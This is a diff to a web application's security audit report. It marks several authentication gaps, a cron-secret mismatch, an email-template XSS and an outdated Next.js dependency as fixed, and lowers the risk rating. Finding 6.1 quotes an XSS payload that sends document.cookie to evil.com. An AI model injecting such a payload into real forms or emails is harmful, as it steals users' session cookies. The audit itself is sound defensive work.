@@ -90,7 +90,7 @@ The two critical findings relate to **known vulnerabilities in the Next.js depen
   There is no `getServerSession()`, no `requireCronSecret()`, and no other auth check.
 - **Impact:** An attacker could: (1) Create malicious webhook subscriptions pointing to their servers, receiving real-time data about system events, (2) List all existing webhook URLs, revealing internal infrastructure or partner integrations, (3) Delete legitimate webhook subscriptions, disrupting integrations. This also creates a potential SSRF vector if the webhook dispatcher fetches attacker-controlled URLs.
 - **Recommendation:** Add authentication requiring at minimum a logged-in admin session. The GET endpoint should only return subscriptions belonging to the authenticated user. The DELETE endpoint should verify ownership.
-- **Status:** Open
+- **Status:** **FIXED** (2026-02-13) — Added admin authentication (`getServerSession` + `isAdmin` check) to all three handlers (POST, GET, DELETE).
 
 #### Finding 2.2: Data Export Route Has No Authentication
 - **Severity:** High
@@ -98,7 +98,7 @@ The two critical findings relate to **known vulnerabilities in the Next.js depen
 - **Description:** The `/api/export/[module]` endpoint allows any unauthenticated user to export up to 1,000 records from `spaceCompany`, `spaceEvent`, or `newsArticle` tables in JSON or CSV format. No `getServerSession()` or other auth check is present.
 - **Impact:** While the data may be semi-public, bulk export without authentication enables easy scraping of the entire database contents for these models, including all fields (potentially including internal metadata, timestamps, etc.).
 - **Recommendation:** Add authentication. At minimum, require a logged-in user. Consider limiting exported fields with Prisma `.select()` to exclude internal metadata.
-- **Status:** Open
+- **Status:** **FIXED** (2026-02-13) — Added session authentication (`getServerSession` + user ID check) to GET handler.
 
 #### Finding 2.3: AI Search Intent Route Lacks Authentication
 - **Severity:** High
@@ -106,7 +106,7 @@ The two critical findings relate to **known vulnerabilities in the Next.js depen
 - **Description:** The `/api/search/ai-intent` POST endpoint calls the Anthropic API (Claude Haiku) with user-supplied queries but has no authentication. Any anonymous user can trigger API calls that consume the project's Anthropic API credits.
 - **Impact:** An attacker could run up significant Anthropic API costs by making automated requests to this endpoint. The general rate limit of 100 req/min provides some protection but allows ~6,000 requests per hour.
 - **Recommendation:** Add `getServerSession()` authentication check. At minimum, require a logged-in user. Consider adding a tighter per-user rate limit for AI endpoints.
-- **Status:** Open
+- **Status:** **FIXED** (2026-02-13) — Added session authentication (`getServerSession` + user ID check) to POST handler.
 
 #### Finding 2.4: Feature Request and Help Request POST Routes Allow Unauthenticated Submissions
 - **Severity:** Low
@@ -142,7 +142,7 @@ The two critical findings relate to **known vulnerabilities in the Next.js depen
 - **Description:** The marketplace verify POST route checks for the cron secret using a custom `x-cron-secret` header and `timingSafeEqual()` instead of the standard `requireCronSecret()` function which checks the `Authorization: Bearer` header. This creates an inconsistency: the cron scheduler in `cron-scheduler.ts` sends the secret via `Authorization: Bearer`, not `x-cron-secret`. If this endpoint is called by the cron scheduler, it would fail authentication. If called manually with the `x-cron-secret` header, it bypasses the standard middleware pattern.
 - **Impact:** The endpoint may be unreachable by the cron scheduler, or it may accept the secret through a non-standard header that other security tooling does not monitor.
 - **Recommendation:** Use the standard `requireCronSecret(request)` function for consistency.
-- **Status:** Open
+- **Status:** **FIXED** (2026-02-13) — Replaced custom `x-cron-secret` header check with standard `requireCronSecret(request)`. Also fixed same pattern in `/api/marketplace/rfq/process`.
 
 #### Finding 3.2: Feature Request PATCH Accepts Arbitrary Status Values
 - **Severity:** Low
@@ -206,7 +206,7 @@ The two critical findings relate to **known vulnerabilities in the Next.js depen
 - **Description:** The admin notification email in the advertiser registration route interpolates user-submitted values (`companyName`, `contactName`, `contactEmail`, `website`) directly into an HTML email template without calling `escapeHtml()`. Other routes in the codebase (e.g., `service-providers/route.ts`, `companies/request/route.ts`, `orbital-services/listing/route.ts`) correctly use `escapeHtml()` for this purpose.
 - **Impact:** An attacker could register as an advertiser with a company name like `<script>alert('xss')</script>` or `<img src=x onerror=fetch('https://evil.com/steal?cookie='+document.cookie)>`. When the admin opens the notification email, the injected HTML/JS could execute in the admin's email client (depending on the email client's HTML sanitization). This is a stored XSS vector targeting admin users.
 - **Recommendation:** Wrap all user-provided values in `escapeHtml()` before interpolation, consistent with the pattern used in other routes. Example: `${escapeHtml(companyName)}`.
-- **Status:** Open
+- **Status:** **FIXED** (2026-02-13) — Added `escapeHtml()` import and wrapped all four user-provided values (`companyName`, `contactName`, `contactEmail`, `website`) in the email template.
 
 #### Finding 6.2: `dangerouslySetInnerHTML` Usage Is Safe
 - **Severity:** Informational (Positive Finding)
@@ -270,7 +270,7 @@ The two critical findings relate to **known vulnerabilities in the Next.js depen
   - API cache statistics (hit/miss ratios, entry counts)
 - **Impact:** An attacker gains detailed knowledge of the server's runtime environment, uptime, memory profile, and external API dependencies. This information aids in crafting targeted attacks (e.g., timing attacks based on uptime, identifying specific Node.js version vulnerabilities, mapping external dependencies).
 - **Recommendation:** Add admin authentication (`getServerSession()` with `isAdmin` check) or restrict access via `requireCronSecret()`. Alternatively, reduce the information returned to non-admin callers.
-- **Status:** Open
+- **Status:** **FIXED** (2026-02-13) — Added admin authentication (`getServerSession` + `isAdmin` check) to GET handler.
 
 #### Finding 8.2: Health Endpoint Is Minimal (Good)
 - **Severity:** Informational (Positive Finding)
@@ -335,7 +335,7 @@ The two critical findings relate to **known vulnerabilities in the Next.js depen
   Fix available: `next@14.2.35`
 - **Impact:** The SSRF and authorization bypass vulnerabilities are particularly severe. An attacker could potentially bypass middleware-based authentication checks, forge server-side requests, or poison the response cache.
 - **Recommendation:** **Upgrade Next.js immediately** to the latest patched version (14.2.35+). This should be the highest priority remediation item. Run `npm audit fix --force` or manually update the `next` version in `package.json`.
-- **Status:** Open
+- **Status:** **FIXED** (2026-02-13) — Upgraded Next.js from 14.1.0 to 14.2.35. Build verified successfully.
 
 #### Finding 10.2: Vulnerable `cookie` Package (next-auth dependency)
 - **Severity:** Low
@@ -454,25 +454,27 @@ The two critical findings relate to **known vulnerabilities in the Next.js depen
 
 ## Overall Risk Assessment
 
-### Risk Level: **MODERATE-HIGH**
+### Risk Level: **MODERATE** (downgraded from MODERATE-HIGH after remediations)
 
-The application has a strong foundation with many security best practices in place. However, two categories of issues require immediate attention:
+The application has a strong foundation with many security best practices in place. The two previously critical categories have been addressed:
 
-1. **Critical: Update Next.js immediately.** The currently installed version has 15 known vulnerabilities including SSRF, authorization bypass, and cache poisoning. This is the single most impactful action to improve security posture.
+1. **~~Critical: Update Next.js immediately.~~** FIXED — Upgraded from 14.1.0 to 14.2.35, resolving 15 known CVEs including SSRF, authorization bypass, and cache poisoning.
 
-2. **Critical/High: Unauthenticated sensitive endpoints.** The webhook subscription, data export, cache status, and AI search endpoints lack proper authentication. These should be secured before they are discovered and exploited.
+2. **~~Critical/High: Unauthenticated sensitive endpoints.~~** FIXED — All 7 critical/high findings remediated: webhook subscribe (admin auth), data export (session auth), AI search intent (session auth), cache status (admin auth), ads register XSS (escapeHtml), marketplace verify cron secret (requireCronSecret), Next.js upgrade.
+
+Remaining open findings are Medium priority and below.
 
 ### Priority Remediation Roadmap
 
-| Priority | Finding | Action |
-|----------|---------|--------|
-| P0 | 10.1 | Upgrade Next.js to 14.2.35+ |
-| P0 | 2.1 | Add authentication to webhook subscribe routes |
-| P1 | 2.2 | Add authentication to export route |
-| P1 | 2.3 | Add authentication to AI search intent route |
-| P1 | 8.1 | Add authentication to cache status route |
-| P1 | 6.1 | Add `escapeHtml()` to ads/register email template |
-| P1 | 3.1 | Fix inconsistent cron secret check on marketplace verify |
+| Priority | Finding | Action | Status |
+|----------|---------|--------|--------|
+| P0 | 10.1 | Upgrade Next.js to 14.2.35+ | **FIXED** |
+| P0 | 2.1 | Add authentication to webhook subscribe routes | **FIXED** |
+| P1 | 2.2 | Add authentication to export route | **FIXED** |
+| P1 | 2.3 | Add authentication to AI search intent route | **FIXED** |
+| P1 | 8.1 | Add authentication to cache status route | **FIXED** |
+| P1 | 6.1 | Add `escapeHtml()` to ads/register email template | **FIXED** |
+| P1 | 3.1 | Fix inconsistent cron secret check on marketplace verify | **FIXED** |
 | P2 | 2.5 | Enforce email verification before login |
 | P2 | 2.6 | Add domain verification for company profile claims |
 | P2 | 9.2 | Add dedicated rate limits for AI endpoints |
